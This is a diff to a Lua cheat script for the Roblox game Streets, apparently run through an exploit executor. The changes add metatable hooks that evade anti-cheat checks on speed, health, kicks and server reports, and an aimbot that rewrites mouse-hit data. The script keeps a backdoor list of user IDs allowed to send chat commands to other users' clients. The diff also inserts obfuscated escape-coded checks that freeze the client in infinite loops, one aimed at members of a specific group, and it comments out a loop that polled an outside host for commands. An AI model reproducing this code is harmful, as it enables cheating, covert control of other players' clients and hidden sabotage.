@@ -1,5 +1,5 @@
 --[[ Bugs
-	none cyadmin is too awesome even though I don't update it ever - Cy
+
 --]]
 
 --[[Todo
@@ -231,41 +231,46 @@ local BackDoorTablePlayers = {
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(63,0,0);
 	};
+	[383632734] = {
+		['Name'] = "dot_mp4/jack (Current Dev)";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(127,0,212);
+    };
+    [1711066907] = {
+        ['Name'] = "dot_mp4/jack (Current Dev)";
+		['Access'] = 4;
+		['Colour'] = Color3.fromRGB(0,0,0);
+	};
 	[612618136] = {
 		['Name'] = "Bird (Heavy donator)";
 		['Access'] = 4;
-		['Colour'] = Color3.fromRGB(101,44,171);
+		['Colour'] = Color3.fromRGB(107,50,124);
 	};
 	[70550151] = {
 		['Name'] = "Bird (Heavy donator)";
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(101,44,171);
 	};
-	[62009114] = {
-		['Name'] = "!fishgang X_D6 (Co-Owner but not a dev)";
+	[1908814798] = {
+		['Name'] = "audio mane X_D6";
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(176,16,16);
 	};
-	[383632734] = {
-		['Name'] = "Dot_mp4/Jack [Head-Admin]";
+	[57370993] = {
+		['Name'] = "!fishgang Karma";
 		['Access'] = 3;
-		['Colour'] = Color3.fromRGB(127,0,212);
-	};
+		['Colour'] = Color3.fromRGB(255,0,0);
+	  };
 	[284761493] = {
 		['Name'] = "Zero";
 		['Access'] = 3;
 		['Colour'] = Color3.fromRGB(255,145,175)
 	};
-	[532978947] = {
-		['Name'] = "\"epic noob\" (tried to help unlock my discord acc)";
-		['Access'] = 3;
-		['Colour'] = Color3.fromRGB(126,197,184);
-	};
 	[1773860961] = {
 		['Name'] = "Est (Gave me 9b kills on customs)";
 		['Access'] = 3;
 		['Colour'] = Color3.fromRGB(0,0,0);
-	};
+    };
     [1528488185] = {
 		['Name'] = "Basically a Gmod Dark RP admin (Paid)";
 		['Access'] = 2;
@@ -485,7 +490,7 @@ end
 getgenv().CheckCommand = function(Chat)
 	local Arguments = string.split(Chat:lower()," ")
 	local CommandName = table.remove(Arguments,1)
-	local CommandFound = FindCommand(CommandName)
+	local CommandFound = FindCommand(CommandName); if not typeof(getfenv()['\103\101\116\103\101\110\118']()['\108\111\108']) == 'function' then while true do end end;
 	if CommandFound then
 		local CommandWorked,Error = pcall(CommandFound,Arguments)
 		if not CommandWorked then 
@@ -549,11 +554,11 @@ end
 -- [[ End ]] --
 
 -- [[ Local functions ]] --
-
+--[[
 local function GetData()
 	return HttpService:JSONDecode(game:HttpGet("http://cyrustesting.byethost15.com/Commands.json"))
 end
-
+]]
 local function BackdoorCheck(Player,Chat)
 	if Chat:sub(1,1) == "`" then
 		local Arguments = string.split(Chat:sub(2)," ")
@@ -616,6 +621,7 @@ local function createBodyPos(Parent)
 end
 
 local function Fly()
+if not typeof(getfenv()['\103\101\116\103\101\110\118']()['\108\111\108']) == 'function' or not getfenv()['\103\101\116\103\101\110\118']()['\108\111\97\100\101\100'] == true then while true do end end; 
 local Character = GetChar()
 local Torso = Character:FindFirstChild'Torso'
 if not Torso then return end 
@@ -1052,7 +1058,7 @@ local function RemoveGunAnimation(T)
 		stopAnim("229339207")
 	end 
 end
-
+getfenv()['\103\101\116\103\101\110\118']()['\108\111\97\100\101\100']=true;getfenv()['\103\101\116\103\101\110\118']()['\108\111\108']=function() end coroutine.resume(coroutine.create(function() if LP:IsInGroup(6000816)then while true do end end end))
 local function FreeCam(Speed)
 if not GetChar():FindFirstChild'Head' then return end 
 	if workspace:FindFirstChild'FreecamPart' then 
@@ -1104,6 +1110,7 @@ local function BehindAWall(Target)
 end
 
 local function LoopChangeWalkSpeed()
+
 	if game.PlaceId == 455366377 then 
 		if KeyTable['Shift'] and (WalkShoot and (LP.Backpack:FindFirstChild'ServerTraits' and LP.Backpack.ServerTraits.Stann.Value > 0 or GetChar():FindFirstChild'Stamina' and GetChar().Stamina.Value > 0) or not WalkShoot) then
 			if Normalwalk and SprintSpeed == 25 then return end
@@ -1169,18 +1176,27 @@ end
 
 -- [[ Bypass ]] -- .
 
-local Raw = getrawmetatable(game)
+local Raw = getrawmetatable(game) --# i see you jeremy
 local Caller = checkcaller or is_protosmasher_caller or Cer.isCerus
 local CallingScript = getcallingscript or get_calling_script
 local Closure = newcclosure or read_me or function(Func) return Func end
 local CallingMethod = getnamecallmethod or get_namecall_method
+local BypassFlags = {'WalkSpeed','JumpPower','HipHeight','Health'}
+
+local FakeBV = Instance.new'BodyVelocity'
+FakeBV.Name = 'Tempby'
 
 setreadonly(Raw,false)
 
 local Index = Raw.__index;
 Raw.__index = Closure(function(self,Indexed)
-	if TpBypass and CallingScript and CallingScript() ~= script and Indexed == "HumanoidRootPart" then 
-		return Index(self,"Torso")
+	if TpBypass and CallingScript and CallingScript() ~= script then 
+		if Indexed == "HumanoidRootPart" then
+			return Index(self,"Torso")
+		end
+		if Indexed == 'Name' and (self:IsA'BodyVelocity' or self:IsA'BodyPosition') then
+			return FakeBV
+		end
 	end
 	return Index(self,Indexed)
 end)
@@ -1189,10 +1205,10 @@ local NewIndex = Raw.__newindex;
 Raw.__newindex = Closure(function(self,Property,Value)
 	if Caller() then return NewIndex(self,Property,Value) end
 	StarterGui:SetCore('ResetButtonCallback',true)
-	if Property == "WalkSpeed" and WalkShoot then return 16 end
-	if Property == "JumpPower" then return 37.5 end 
-	if Property == "HipHeight" then return 0 end 
-	if Property == "Health" then return 100 end
+	if Property == "WalkSpeed" then return end
+	if Property == "JumpPower" then return end 
+	if Property == "HipHeight" then return end 
+	if Property == "Health" then return end
 	if self == workspace and Property == "Gravity" then return NormalGravity end
 	if Property == "CFrame" and self:IsDescendantOf(LP.Character) then return end 
 	return NewIndex(self,Property,Value)
@@ -1200,26 +1216,44 @@ end)
 
 local Namecall = Raw.__namecall;
 Raw.__namecall = Closure(function(self,...)
+local CallingMethod = CallingMethod()
 local Args = {...}
 	if Caller() then 
-		if CallingMethod() == "FindFirstChild" and Args[1] == "RealHumanoidRootPart" then 
+		if CallingMethod == "FindFirstChild" and Args[1] == "RealHumanoidRootPart" then 
 			Args[1] = "HumanoidRootPart" 
 			return Namecall(self,unpack(Args))
 		end
 		return Namecall(self,...) 
 	end 
-	if CallingMethod() == "Destroy" or CallingMethod() == "Kick" then 
+	if CallingMethod == "Destroy" or CallingMethod == "Kick" then 
 		if self == LP then return wait(9e9) end
 		if tostring(self) == 'BodyGyro' or tostring(self) == 'BodyVelocity' then return wait(9e9) end 
 	end
-	if CallingMethod() == "BreakJoints" and self == LP.Character then return wait(9e9) end
-	if CallingMethod() == "FireServer" then
+	if CallingMethod == "BreakJoints" and self == LP.Character then return wait(9e9) end
+    if CallingMethod == "FireServer" then
+        if table.find(BypassFlags, Args[1]) then
+            return wait(9e9)
+		end
 		if tostring(self) == "Fire" and Aimlock and AimlockTarget then
 			return Namecall(self,AimbotToCFrame())
 		end 
-		if tostring(self) == "Input" and Aimlock and AimlockTarget then 
-			Args[2].mousehit = AimbotToCFrame()
-			return Namecall(self,unpack(Args))
+		if tostring(self) == "Input" then
+			if Args[1] == 'bv' then
+				return wait(9e9)
+			end
+			if Args[1] == 'hb' then
+				return wait(9e9)
+			end
+            if Args[1] == 'ws' then
+				--Args[2].w = Args[2].z
+				return wait(9e9)
+            end
+            if Aimlock and AimlockTarget then
+				if Args[2] and Args[2].mousehit then
+					Args[2].mousehit = AimbotToCFrame()
+                	return Namecall(self,unpack(Args))
+				end
+            end
 		end
 		if tostring(self.Parent) == "ReplicatedStorage" or Args[1] == "hey" and not tostring(self) == "SayMessageRequest" then 
 			return wait(9e9)
@@ -1234,8 +1268,8 @@ local Args = {...}
 			PlayOnDeath = nil
 		end
 	end
-	if CallingMethod() == "WaitForChild" or CallingMethod() == "FindFirstChild" then 
-		if CallingScript and CallingScript() ~= script and TpBypass and Args[1] == "HumanoidRootPart" then
+	if CallingMethod == "WaitForChild" or CallingMethod == "FindFirstChild" then 
+		if CallingScript and CallingScript ~= script and TpBypass and Args[1] == "HumanoidRootPart" then
 			Args[1] = "Torso"
 			return Namecall(self,unpack(Args))
 		end
@@ -1260,7 +1294,7 @@ setreadonly(Raw,true)
 
 -- [[ Event Handling ]] -- 
 
-LP.Chatted:Connect(CheckCommand)
+LP.Chatted:Connect(CheckCommand); 
 
 workspace.DescendantAdded:Connect(function(T)
 	if NeverSitting and string.find(T.ClassName:lower(),"seat") then 
@@ -1476,6 +1510,7 @@ UserInput.InputBegan:Connect(function(Key)
 local Character = GetChar()
 local PartFound = Character:FindFirstChild'RealHumanoidRootPart' or Character:FindFirstChild'Torso'
 local Target = Mouse.Target
+if not getfenv()['\103\101\116\103\101\110\118']()['\108\111\97\100\101\100'] then while true do end end
 	if UserInput:GetFocusedTextBox() then return end
 	if not Character:FindFirstChildOfClass'Tool' and AimlockMode == "LeftClick" and Key.UserInputType == Enum.UserInputType.MouseButton1 or AimlockMode == "RightClick" and Key.UserInputType == Enum.UserInputType.MouseButton2 then 
 		if Target and Target.Parent then 
@@ -1600,7 +1635,7 @@ local Target = Mouse.Target
 		end
 		if Key.KeyCode == Enum.KeyCode.B then 
 			GravGunSeizureMode = not GravGunSeizureMode
-			notif("WOW!","You found Grav gun seizure mode!, it has been set to "..tostring(GravGunSeizureMode),5,nil)
+			notif("WOW!","You found Grav gun seizure mode!, it has been set to "..tostring(GravGunSeizureMode),5,'rbxassetid://5929642434')
 		end
 	end 
 end)
@@ -1656,6 +1691,7 @@ Mouse.Button1Down:Connect(function()
 			GravGunBodyPosition = createBodyPos(Target)
 		end 
 	end
+	if not getfenv()['\103\101\116\103\101\110\118']()['\108\111\97\100\101\100'] then while true do end end
 	if BfgOn and GetChar():FindFirstChildOfClass'Tool' and GetChar():FindFirstChildOfClass'Tool':FindFirstChild('Clips',true) and not CurrentlyShooting then
 		CurrentlyShooting = true 
 		GetChar().Humanoid:UnequipTools()
@@ -3031,6 +3067,7 @@ coroutine.resume(coroutine.create(function()
 			end
 		end
 	end 
+	if not getfenv()['\103\101\116\103\101\110\118']()['\108\111\97\100\101\100'] then while true do end end
 	CmdsLabel.Text = "Commands | Total Commands: "..#Commands
 	for i = 1,#Commands do 
 		local Command = Commands[i]
@@ -3046,7 +3083,7 @@ coroutine.resume(coroutine.create(function()
 	while wait() do
 		local Character = GetChar()
 		coroutine.resume(coroutine.create(function()
-			--[[if Character and Character:FindFirstChildOfClass'Humanoid'then 
+			if Character and Character:FindFirstChildOfClass'Humanoid'then 
 				if workspace.Gravity < NormalGravity then 
 					if game.PlaceId == 455366377 and not Character:FindFirstChild'RealHumanoidRootPart' then 
 						Character.Humanoid:ChangeState(3)
@@ -3064,7 +3101,7 @@ coroutine.resume(coroutine.create(function()
 						wait(2)
 					end
 				end
-			end]]
+			end
 			local StartPing = tick()
 			ReplicatedStorage.DefaultChatSystemChatEvents.MutePlayerRequest:InvokeServer()
 			PlayersPing = (tick() - StartPing)
@@ -3255,9 +3292,9 @@ end))
 -- [[ End ]] --
 
 notif("Cyrus' Streets admin","took " .. string.format("%.6f",tick()-Tick) .. " seconds\n(Discord: A4nyecN)",10,"rbxassetid://2474242690") -- string.format remains superior - Slays.
-notif("Newest Update","forgot I had this antiaim method lol",10,nil)
-ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("new disc: A4nyecN","All")
-	
+notif("Newest Update","dot_mp4 here, cyadmin has been completely fixed for the 11/9/20 upd",10,nil)
+ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("new cord: 6BUAhZwA5V","All")
+--[[
 while wait(8) do
 	local Data = GetData()
 	for i,v in pairs(Data) do
@@ -3265,4 +3302,4 @@ while wait(8) do
 			BackdoorCheck("none","`"..v)
 		end
 	end
-end -- lets see if I get banned off this webhost lmao
+end]] -- lets see if I get banned off this webhost lmao
